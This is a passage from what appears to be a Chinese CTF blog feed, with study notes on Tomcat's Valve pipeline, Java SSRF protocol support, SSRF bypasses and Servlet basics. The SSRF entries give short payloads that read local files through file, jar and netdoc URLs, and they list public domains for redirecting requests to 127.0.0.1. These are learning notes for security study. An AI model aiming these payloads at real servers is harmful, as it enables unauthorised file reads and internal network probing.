class="params">()</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setNext</span><span class="params">(Valve valve)</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>Pipeline接口如下，Pipeline 中有 addValve 方法。Pipeline 中维护了<strong>一个Valve链表</strong>，Valve 可以插入到 Pipeline 中，对请求做某些处理</p><ol><li>Pipeline 中没有 invoke 方法，因为整个调用链的触发是 Valve 来完成的，Valve 完成自己的处理后，调用 getNext.invoke() 来触发下一个 Valve 调用</li></ol>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Pipeline</span> <span class="keyword">extends</span> <span class="title class_">Contained</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addValve</span><span class="params">(Valve valve)</span>;</span><br><span class="line">  <span class="keyword">public</span> Valve <span class="title function_">getBasic</span><span class="params">()</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setBasic</span><span class="params">(Valve valve)</span>;</span><br><span class="line">  <span class="keyword">public</span> Valve <span class="title function_">getFirst</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol></li><li><p>tomcat容器中的pipline<br> <img src="/pic/Java%E5%AE%89%E5%85%A86(2)_Tomcat%E6%95%B4%E4%BD%93%E6%9E%B6%E6%9E%84/tomcat_container_pipline.png" alt="pic"></p><ol><li>Tomcat中每一个容器都有一个 Pipeline 对象</li><li>触发这个 Pipeline 的第一个 Valve，这个容器里 Pipeline 中的 Valve 就都会被调用到</li><li>这个 BasicValve 处于 Valve 链表的末端，它是 Pipeline 中必不可少的一个 Valve，负责调用下层容器的 Pipeline 里的第一个 Valve</li><li>不同容器的 Pipeline 通过getBasic 方法调用下层容器的Pipeline里的第一个Valve</li><li><strong>由Adapter触发</strong>: 整个调用过程由连接器中的 Adapter 触发的，它会调用 Engine 的第一个 Valve</li></ol></li></ol><h3 id="Valve和Filter"><a href="#Valve和Filter" class="headerlink" title="Valve和Filter?"></a>Valve和Filter?</h3><ol><li>Valve 是 Tomcat 的私有机制，与 Tomcat 的基础架构 &#x2F;API 是紧耦合的，它工作在容器级别，<strong>拦截所有应用的请求</strong></li><li>Filter 工作在应用级别，只能拦截某个 Web 应用的所有请求</li><li>如果想要一个整个web容器的filter，其实应该使用Valve来进行实现</li></ol><h2 id="连接器与Sevlet容器的架构作用"><a href="#连接器与Sevlet容器的架构作用" class="headerlink" title="连接器与Sevlet容器的架构作用"></a>连接器与Sevlet容器的架构作用</h2><ol><li>Sevlet容器是一个路由与服务处理功能，<strong>负责内部处理</strong></li><li>连接器就是用于封装网络结构的，<strong>负责外部交流</strong></li></ol><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ol><li>较为细节，可做补充[<a href="https://blog.nowcoder.net/n/0c4b545949344aa0b313f22df9ac2c09]">https://blog.nowcoder.net/n/0c4b545949344aa0b313f22df9ac2c09]</a></li><li>[<a href="https://www.maishuren.top/posts/tomcat/1-tomcat%E4%B8%AD%E7%9A%84%E8%BF%9E%E6%8E%A5%E5%99%A8%E6%98%AF%E5%A6%82%E4%BD%95%E8%AE%BE%E8%AE%A1%E7%9A%84/]">https://www.maishuren.top/posts/tomcat/1-tomcat%E4%B8%AD%E7%9A%84%E8%BF%9E%E6%8E%A5%E5%99%A8%E6%98%AF%E5%A6%82%E4%BD%95%E8%AE%BE%E8%AE%A1%E7%9A%84/]</a></li><li>[<a href="https://www.maishuren.top/posts/tomcat/2-tomcat%E4%B8%ADsevlet%E5%AE%B9%E5%99%A8%E7%9A%84%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86/]">https://www.maishuren.top/posts/tomcat/2-tomcat%E4%B8%ADsevlet%E5%AE%B9%E5%99%A8%E7%9A%84%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86/]</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
            <tag> Java内存马 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java安全7_ssrf</title>
      <link href="/2024/11/30/Java%E5%AE%89%E5%85%A87_ssrf/"/>
      <url>/2024/11/30/Java%E5%AE%89%E5%85%A87_ssrf/</url>
      
        <content type="html"><![CDATA[<h2 id="网络相关的类与协议"><a href="#网络相关的类与协议" class="headerlink" title="网络相关的类与协议"></a>网络相关的类与协议</h2><ol><li><p><strong>类</strong>: 从网上搜刮来的类有这么多</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HttpClient</span><br><span class="line">Request <span class="comment"># 第三方，对HttpClient封装后的类</span></span><br><span class="line">HttpURLConnection</span><br><span class="line">URLConnection</span><br><span class="line">URL</span><br><span class="line">okhttp  <span class="comment"># 第三方</span></span><br><span class="line">ImageIO</span><br></pre></td></tr></table></figure></li><li><p><strong>协议</strong>: Java网络请求支持的协议可通过下面几种方法检测</p><ol><li><p>代码中遍历协议</p></li><li><p>官方文档中查看</p></li><li><p>import sun.net.<a href="http://www.protocol查看/">www.protocol查看</a></p><ol><li>可以发现，每一个协议都有其对应的一个Handler和一个XXXURLConnection继承URLConnection的子类</li><li>jdk7u21<ol><li>gopher实际在jdk8版本以后被阉割了，jdk7高版本虽然存在，但是需要设置</li><li><img src="/pic/Java%E5%AE%89%E5%85%A87_ssrf/protocals.png" alt="jdk7u21"></li></ol></li><li>这是jdk8<img src="/pic/Java%E5%AE%89%E5%85%A87_ssrf/jdk8_protocals.png" alt="jdk8"></li><li>jdk11高版本上netdoc也被弃用</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// jdk7u2</span></span><br><span class="line">file ftp mailto http https jar netdoc gopher</span><br><span class="line"><span class="comment">// jdk8中看不到gopher了</span></span><br></pre></td></tr></table></figure></li></ol></li><li><p><strong>限制</strong></p><ol><li>如果用URL和URLConnection还有ImageIO类的方法发起请求，则支持sun.net.<a href="http://www.protocol所有协议/">www.protocol所有协议</a></li><li>如果使用HttpURLConnection, HttpClient, Request, okhttp这些协议就只支持http和https协议<ol><li>Request类对HttpClient进行了封装。类似Python的requests库。用法及其简单，一行代码就可以获取网页内容<code>Request.Get(url).execute().returnContent().toString();</code></li></ol></li></ol></li></ol><h2 id="URLConnection与URL示例"><a href="#URLConnection与URL示例" class="headerlink" title="URLConnection与URL示例"></a>URLConnection与URL示例</h2><ol><li><p>发起一个简单请求</p><ol><li>这里使用的file协议需要是<code>file:./</code>而不是<code>file://</code></li><li><strong>遇到这两个类可以用其他协议进行攻击</strong></li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLConnection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConnectionTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">        </span><br><span class="line">            <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;file:./src/main/java/HelloSSRF.txt&quot;</span>);    <span class="comment">// 相对于项目根目录</span></span><br><span class="line">            <span class="type">URLConnection</span> <span class="variable">conn</span> <span class="operator">=</span> url.openConnection();</span><br><span class="line"></span><br><span class="line">            conn.setConnectTimeout(<span class="number">1000</span>);</span><br><span class="line">            conn.setReadTimeout(<span class="number">1000</span>);</span><br><span class="line">            conn.setRequestProperty(<span class="string">&quot;user-agent&quot;</span>, <span class="string">&quot;KC1zs4&quot;</span>);    <span class="comment">// 可以以键值对形式设置请求头</span></span><br><span class="line"></span><br><span class="line">            conn.connect();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 进行输出 </span></span><br><span class="line">            <span class="type">StringBuilder</span> <span class="variable">resp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(conn.getInputStream()));</span><br><span class="line">            String line;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> ((line = in.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                resp.append(line).append(<span class="string">&quot;\n&quot;</span>); <span class="comment">// 进行换行</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            System.out.print(resp.toString());</span><br><span class="line"></span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="http-https默认处理"><a href="#http-https默认处理" class="headerlink" title="http|https默认处理"></a>http|https默认处理</h2><ol><li><p>默认启用了透明NTLM认证</p></li><li><p>默认跟随跳转</p><ol><li>进入到HttpURLConnection.class中，搜索<code>followRedirect</code>，可以再以下代码出看到<strong>要求url的协议和Location头中的协议是一致的</strong></li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="built_in">this</span>.getHeaderField(<span class="string">&quot;Location&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (var2 == <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    URL var3;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        var3 = <span class="keyword">new</span> <span class="title class_">URL</span>(var2);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">this</span>.url.getProtocol().equalsIgnoreCase(var3.getProtocol())) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><h2 id="Java中的SSRF"><a href="#Java中的SSRF" class="headerlink" title="Java中的SSRF"></a>Java中的SSRF</h2><h3 id="new-URL"><a href="#new-URL" class="headerlink" title="new URL()"></a>new URL()</h3><ol><li>在查看jarURLConnection时查到了下面这段话</li><li>When constructing a JAR url via new URL(context, spec), the following rules apply:<ol><li>if there is no context URL and the specification passed to the URL constructor doesn’t contain a separator, the URL is considered to refer to a JarFile.</li><li>if there is a context URL, the context URL is assumed to refer to a JAR file or a Jar directory.</li><li>if the specification begins with a ‘&#x2F;‘, the Jar directory is ignored, and the spec is considered to be at the root of the Jar file.</li></ol></li><li>例子如下<ol><li>context: <code>jar:http://www.foo.com/bar/jar.jar!/</code>, spec:baz&#x2F;entry.txt<ol><li>url:<code>jar:http://www.foo.com/bar/jar.jar!/baz/entry.txt</code></li></ol></li><li>context: <code>jar:http://www.foo.com/bar/jar.jar!/baz</code>, spec:entry.txt<ol><li>url:<code>jar:http://www.foo.com/bar/jar.jar!/baz/entry.txt</code></li></ol></li><li>context: <code>jar:http://www.foo.com/bar/jar.jar!/baz</code>, spec:&#x2F;entry.txt<ol><li>url:<code>jar:http://www.foo.com/bar/jar.jar!/entry.txt</code></li></ol></li></ol></li></ol><h3 id="jar"><a href="#jar" class="headerlink" title="jar:&#x2F;&#x2F;"></a>jar:&#x2F;&#x2F;</h3><ol><li><p><a href="https://docs.oracle.com/javase/8/docs/api/java/net/JarURLConnection.html">官方文档</a>，jar:&#x2F;&#x2F;协议能从远程获取jar文件及解压得到其中的内容</p><ol><li>主要格式如下<code>jar:&lt;url&gt;!/&#123;entry&#125;</code>，!符号后面就是其需要从中解压出的文件，这里的url是需要包含协议的</li><li><strong>只读</strong>: JarURLConnection 实例只能用于从 JAR 文件中读取。使用此类无法获取 OutputStream 来修改或写入底层 JAR 文件</li><li>jar协议处理文件过程<ol><li>下载 jar&#x2F;zip 文件到临时文件中</li><li>提取出我们指定的文件</li><li>删除临时文件</li></ol></li></ol> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jar:http://www.foo.com/bar/baz.jar!/    <span class="comment"># jar包本身</span></span><br><span class="line">jar:http://xxx.xxx.xxx/bar/bar.jar!/info.txt    <span class="comment"># jar包中的资源文件</span></span><br><span class="line">jar:http://xxx.xxx.xxx/bar/baz.jar!/info_dir/    <span class="comment"># jar包中的某个目录    </span></span><br></pre></td></tr></table></figure></li></ol><h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><ol><li>一般情况下Java的ssrf利用方式比较有限，因为仅有(URL和)URLConnection可以使用其他协议<ol><li>使用file, netdoc, jar, ImageIO加载文件<ol><li>ImageIO只能读取文件以及探测文件存不存在</li><li>通file协议，结合不同的返回type会读取到或者下载文件，<code>file:///flag.txt</code></li><li>jar读源码：如果jar包还是开发者自定义的话就会造成源码泄露<code>?url=jar:http://127.0.0.1/ysoserial.jar!/ysoserial/payloads/C3P0.class</code></li><li>netdoc类似file，<code>url=netdoc:///Users/xxxx/sql.txt</code></li></ol></li><li>使用http探测端口: 通过不同的返回结果可以判断是否由开放某个端口</li></ol></li><li>例题可以看pcb23的http，是java背景的ssrf，需要涉及一些分析</li></ol><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ol><li><a href="https://www.javasec.org/javase/URLConnection/">javasec</a></li><li>[<a href="https://www.cnblogs.com/CoLo/p/15236424.html#urlconnection]">https://www.cnblogs.com/CoLo/p/15236424.html#urlconnection]</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
            <tag> ssrf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>再遇ssrf</title>
      <link href="/2024/11/30/%E5%86%8D%E9%81%87ssrf/"/>
      <url>/2024/11/30/%E5%86%8D%E9%81%87ssrf/</url>
      
        <content type="html"><![CDATA[<blockquote><p>为什么是再遇呢？因为九月or十月初的时候做bp靶场的时候有学过一次了，今天hitctf有道wget让我想起来还有这个点了</p></blockquote><h2 id="核心思想"><a href="#核心思想" class="headerlink" title="核心思想"></a>核心思想</h2><ol><li>ssrf的核心思想在于<strong>对外部发出请求</strong><ol><li>可以利用到对内部其他服务器</li><li>也可以利用到外带等技术</li></ol></li></ol><h2 id="可利用协议"><a href="#可利用协议" class="headerlink" title="可利用协议"></a>可利用协议</h2><blockquote><p>不同语言的可利用协议要看该语言是否支持，比如java中就没有dict，php中也没有jar</p></blockquote><h3 id="gopher"><a href="#gopher" class="headerlink" title="gopher"></a>gopher</h3><ol><li>历史：gopher 协议是一个在http 协议诞生前用来访问Internet 资源的协议可以理解为http 协议的前身或简化版，虽然很古老但现在很多库还支持gophe</li><li>协议格式<code>gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;</code><ol><li>其中的port默认为70端口</li><li><code>&lt;gopher-path&gt;</code>格式可以是如下其中的一种<ol><li><code>&lt;gophertype&gt;&lt;selector&gt;</code></li><li><code>&lt;gophertype&gt;&lt;selector&gt;%09&lt;search&gt;</code></li><li><code>&lt;gophertype&gt;&lt;selector&gt;%09&lt;search&gt;%09&lt;gopher+_string&gt;</code></li></ol></li></ol></li><li>最后总结一下作用<ol><li>构造HTTP请求：Gopher协议可以用于构造并发送原始的HTTP GET或POST请求，这在某些情况下可能被用作绕过安全限制的方法。</li><li>访问受限资源：由于Gopher协议相对较少被关注，有时它可以用来尝试访问那些对其他协议（如HTTP）设置了严格限制的资源。</li></ol></li></ol><h2 id="常见绕过姿势"><a href="#常见绕过姿势" class="headerlink" title="常见绕过姿势"></a>常见绕过姿势</h2><h3 id="302重定向绕过"><a href="#302重定向绕过" class="headerlink" title="302重定向绕过"></a>302重定向绕过</h3><ol><li><p>比如把127.0.0.1过滤的死死的话就需要使用网上的服务进行重定向到127.0.0.1</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http://safe.taobao.com/</span><br><span class="line">http://sudo.cc/</span><br><span class="line">http://114.taobao.com/</span><br><span class="line">http://wifi.aliyun.com/</span><br><span class="line">http://imis.qq.com/</span><br><span class="line">http://localhost.sec.qq.com/</span><br><span class="line">http://ecd.tencent.com/</span><br></pre></td></tr></table></figure></li></ol><h3 id="进制绕过"><a href="#进制绕过" class="headerlink" title="进制绕过"></a>进制绕过</h3><ol><li>对于数字类型的</li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssrf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java安全6(1)_初识JavaWeb</title>
      <link href="/2024/11/28/Java%E5%AE%89%E5%85%A86(1)_%E5%88%9D%E8%AF%86JavaWeb/"/>
      <url>/2024/11/28/Java%E5%AE%89%E5%85%A86(1)_%E5%88%9D%E8%AF%86JavaWeb/</url>
      
        <content type="html"><![CDATA[<h2 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h2><h3 id="什么是Servlet"><a href="#什么是Servlet" class="headerlink" title="什么是Servlet"></a>什么是Servlet</h3><ol><li><p>在JavaEE平台上，处理TCP连接，解析HTTP协议这些底层工作统统扔给现成的Web服务器去做，我们只需要把自己的应用程序跑在Web服务器上。为了实现这一目的，JavaEE提供了Servlet API，我们使用Servlet API编写自己的Servlet来处理HTTP请求，Web服务器实现Servlet API接口，实现底层功能<img src="/pic/Java%E5%AE%89%E5%85%A86(1)_%E5%88%9D%E8%AF%86JavaWeb/javaweb_servlet_structure.png" alt="javaweb_servlet_structure"></p></li><li><p>Servlet本质上是一个接口，定义于javax.servlet.Servlet包中。但是，当开发者提到Servlet时，通常指的是实现了这个接口的类</p><ol><li>在实际开发中最常用的不是直接实现Servlet接口，而是<strong>继承自javax.servlet.http.HttpServlet抽象类</strong>，这是因为HttpServlet已经为我们提供了一些处理HTTP请求的基本方法（如doGet(), doPost()等），使得我们可以更加专注于业务逻辑的实现而不需要关心太多底层细节</li><li>在tomcat服务器上运行servlet<ol><li>因为我们编写的Servlet并不是直接运行，而是由Web服务器加载后创建实例运行，所以，类似Tomcat这样的Web服务器也称为Servlet容器</li><li>类似Tomcat这样的服务器也是Java编写的，启动Tomcat服务器实际上是启动Java虚拟机，执行Tomcat的main()方法，然后由Tomcat负责加载我们的.war文件，并创建一个HelloServlet实例，最后以多线程的模式来处理HTTP请求。如果Tomcat服务器收到的请求路径是&#x2F;（假定部署文件为ROOT.war），就转发到HelloServlet并传入HttpServletRequest和HttpServletResponse两个对象</li></ol></li><li><strong>Servlet的角色</strong><ol><li>中间件：Servlet充当客户端（如浏览器）和后端资源（如数据库或文件系统）之间的桥梁。</li><li>控制器：在MVC（Model-View-Controller）设计模式中，Servlet通常扮演控制器的角色，负责接收用户输入、调用业务逻辑组件，并选择合适的视图来展示结果。</li><li>服务提供者：Servlet可以看作是为用户提供特定服务的组件，这些服务可能涉及数据处理、内容生成等。</li></ol></li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> javax.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Servlet</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig var1)</span> <span class="keyword">throws</span> ServletException;</span><br><span class="line"></span><br><span class="line">    ServletConfig <span class="title function_">getServletConfig</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest var1, ServletResponse var2)</span> <span class="keyword">throws</span> ServletException, IOException;</span><br><span class="line"></span><br><span class="line">    String <span class="title function_">getServletInfo</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>创建一个Servlet主要包括以下几个步骤：</p><ol><li>实现javax.servlet.Servlet接口或者继承javax.servlet.http.HttpServlet类。</li><li>覆盖相应的方法，比如doGet()或doPost()来处理HTTP GET或POST请求。</li><li>在web.xml文件中配置Servlet，指定URL模式与Servlet之间的映射关系，或者是使用注解的方式直接在代码中进行配置。<ol><li><strong>在Servlet3.0以来支持使用注解进行配置而无需web.xml</strong></li></ol></li></ol></li></ol><h3 id="运行一个Servlet"><a href="#运行一个Servlet" class="headerlink" title="运行一个Servlet"></a>运行一个Servlet</h3><h4 id="版本设置"><a href="#版本设置" class="headerlink" title="版本设置"></a>版本设置</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java: 1.8.0_66,</span><br><span class="line">jakarta.servlet-api: 4.0.4,</span><br><span class="line">tomcat: 9.0.97,</span><br></pre></td></tr></table></figure><h4 id="Servlet-Java和Tomcat版本的兼容性"><a href="#Servlet-Java和Tomcat版本的兼容性" class="headerlink" title="Servlet, Java和Tomcat版本的兼容性"></a>Servlet, Java和Tomcat版本的兼容性</h4><ol><li>tomcat(全部适配)<ol><li>Tomcat的官网上可以看到<a href="https://tomcat.apache.org/whichversion.html">指引</a></li><li>也可以在Tomcat下载中看需知文件中的对应版本的配置</li></ol></li><li>Servlet和java的适应关系<ol><li><a href="https://zh.wikipedia.org/wiki/Java_Servlet">wiki百科</a></li></ol></li><li>JavaEE历史<ol><li><a href="https://en.wikipedia.org/wiki/Jakarta_EE">wiki百科</a></li></ol></li></ol><h4 id="pom-xml"><a href="#pom-xml" class="headerlink" title="pom.xml"></a>pom.xml</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shiro<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>JavaSec_WebDev<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">packaging</span>&gt;</span>war<span class="tag">&lt;/<span class="name">packaging</span>&gt;</span>  <span class="comment">&lt;!--用于运行时生成war包--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- https://mvnrepository.com/artifact/javax.servlet/javax.servlet-api --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javax.servlet-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">finalName</span>&gt;</span>HelloServlet<span class="tag">&lt;/<span class="name">finalName</span>&gt;</span> <span class="comment">&lt;!--生成war包的名字--&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="Hello-Servlet"><a href="#Hello-Servlet" class="headerlink" title="Hello Servlet"></a>Hello Servlet</h4><ol><li>S1: 无需进行目录结构，直接在包中编写以下脚本</li><li>S2: edit configuration(IDEA)中并添加tomcat，可以设置热加载(需要war explode和debug)</li><li>S3: run！</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span 